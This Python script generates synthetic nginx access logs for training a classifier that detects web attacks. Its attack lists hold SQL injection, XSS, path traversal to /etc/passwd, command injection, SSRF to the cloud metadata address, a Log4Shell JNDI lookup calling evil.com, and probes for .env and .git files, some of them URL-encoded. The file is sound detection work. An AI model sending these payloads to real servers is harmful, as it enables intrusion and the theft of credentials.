import random
import pandas as pd

from backend.app.parser import parse_nginx_log
from backend.app.features import extract_features


NORMAL_PATHS = [
    "/", "/home", "/login", "/products", "/about", "/contact",
    "/api/items", "/dashboard", "/profile", "/static/app.js",
    "/search?q=phone", "/products?id=12", "/docs/help",
    "/login?next=/dashboard", "/api/items?page=2"
]

WEAK_ATTACKS = [
    "/login?user=admin' OR 1=1--",
    "/products?id=1 UNION SELECT username,password FROM users",
    "/search?q=<script>alert(1)</script>",
    "/download?file=../../../etc/passwd",
    "/api?cmd=whoami",
    "/fetch?url=http://169.254.169.254/latest/meta-data/",
    "/?q=${jndi:ldap://evil.com/a}",
    "/.env",
    "/.git/config",
]

OBFUSCATED_ATTACKS = [
    "/login?user=admin%27%20OR%201%3D1--",
    "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/static/..%2f..%2f..%2fetc%2fpasswd",
    "/api?c%6Dd=whoami",
    "/proxy?url=http%3A%2F%2Flocalhost%3A8080%2Fadmin",
    "/?q=${jndi:ldap://evil.com/a}",
]

BORDERLINE_MALICIOUS = [
    "/search?q=admin",
    "/products?id=1",
    "/login?user=admin",
    "/download?file=report.pdf",
    "/api/items?url=http://example.com/image.png",
]


def nginx_line(path: str, status: int, size: int, method: str = "GET") -> str:
    return f'127.0.0.1 - - [03/May/2026:10:00:00 +0100] "{method} {path} HTTP/1.1" {status} {size}'


def generate_log(label: int) -> str:
    method = random.choice(["GET", "GET", "POST"])
    status = random.choice([200, 200, 200, 301, 403, 404])
    size = random.randint(200, 6000)

    if label == 0:
        # Mostly normal, but with some suspicious-looking benign overlap
        if random.random() < 0.15:
            path = random.choice(BORDERLINE_MALICIOUS)
        else:
            path = random.choice(NORMAL_PATHS)
    else:
        # Mix obvious, obfuscated, and borderline attacks
        r = random.random()
        if r < 0.55:
            path = random.choice(WEAK_ATTACKS)
        elif r < 0.85:
            path = random.choice(OBFUSCATED_ATTACKS)
        else:
            path = random.choice(BORDERLINE_MALICIOUS)

    return nginx_line(path, status, size, method)


def generate_dataset(n=5000):
    rows = []

    for _ in range(n):
        # Imbalanced but realistic: fewer attacks than benign
        label = 1 if random.random() < 0.25 else 0

        log = generate_log(label)
        parsed = parse_nginx_log(log)
        features = extract_features(parsed)

        row = features.copy()
        row["label"] = label
        rows.append(row)

    df = pd.DataFrame(rows)
    df.to_csv("data/ml_dataset.csv", index=False)

    print("Dataset generated:", df.shape)
    print(df["label"].value_counts())


if __name__ == "__main__":
    generate_dataset()
